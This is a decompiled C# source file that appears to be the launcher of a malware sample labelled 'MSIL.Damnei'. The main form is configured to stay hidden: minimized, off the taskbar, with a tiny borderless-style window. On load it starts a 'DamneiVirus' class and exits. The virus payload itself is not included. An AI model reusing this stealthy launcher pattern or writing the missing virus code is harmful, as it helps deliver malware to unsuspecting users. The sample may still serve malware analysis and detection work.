using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace FirstPrep;

public class Damnei : Form
{
	private Container components = null;

	public Damnei()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Form)this).set_AutoScaleBaseSize(new Size(5, 13));
		((Form)this).set_ClientSize(new Size(90, 2));
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Damnei");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("MSIL.Damnei");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Damnei_Load);
	}

	[STAThread]
	private static void Main()
	{
		Application.Run((Form)(object)new Damnei());
	}

	private void Damnei_Load(object sender, EventArgs e)
	{
		DamneiVirus damneiVirus = new DamneiVirus();
		damneiVirus.Start();
		Application.Exit();
	}
}
